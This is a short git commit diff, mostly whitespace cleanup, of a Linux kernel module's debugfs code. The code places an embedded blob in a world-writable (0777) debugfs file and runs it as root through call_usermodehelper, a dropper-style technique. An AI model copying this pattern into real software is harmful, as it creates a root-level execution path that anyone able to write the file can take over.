030f40a418847f1c509c9882ba3002a8685c2ba0
nbulischeck <nbulischeck@users.noreply.github.com>
2018-05-10 17:33:09 -0400

    Cleaned debugfs code

--- debugfs.c
+++ debugfs.c
@@ -14,34 +14,38 @@ void destroy_file(void){
 }
 
 void execute_file(void){
-    static char *envp[] = {
-        "SHELL=/bin/bash",
-        "HOME=/root/",
-        "USER=root",
-        "PATH=/usr/local/sbin:/usr/local/bin:"\
-                "/usr/sbin:/usr/bin:/sbin:/bin",
-        "DISPLAY=:0",
-        "PWD=/", 
-        NULL};
+	static char *envp[] = {
+		"SHELL=/bin/bash",
+		"HOME=/root/",
+		"USER=root",
+		"PATH=/usr/local/sbin:/usr/local/bin:"\
+			"/usr/sbin:/usr/bin:/sbin:/bin",
+		"DISPLAY=:0",
+		"PWD=/", 
+		NULL
+	};
 
-    char *argv[] = {"/usr/bin/go", "run", "/sys/kernel/debug/debug_exec.go", NULL};
+	char *argv[] = {
+		"/sys/kernel/debug/debug_exec",
+		NULL
+	};
 
-    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 }
 
 int create_file(void){
-    /* get mem for blob struct and init */
-    myblob = kmalloc(sizeof(struct debugfs_blob_wrapper), GFP_KERNEL);
+	/* get mem for blob struct and init */
+	myblob = kmalloc(sizeof(struct debugfs_blob_wrapper), GFP_KERNEL);
 	if (myblob == NULL){
 		return -ENOMEM;
 	}
 
-    /* only set data pointer and data size */
+	/* only set data pointer and data size */
 	myblob->data = (void *) buffer;
 	myblob->size = (unsigned long) buffer_length;
 
-    /* create pseudo file under /sys/kernel/debug_exec */
-    dfs = debugfs_create_blob("debug_exec", 0777, NULL, myblob);
+	/* create pseudo file under /sys/kernel/debug_exec */
+	dfs = debugfs_create_blob("debug_exec", 0777, NULL, myblob);
 	if (!dfs){
 		kfree(myblob);
 		return -EINVAL;
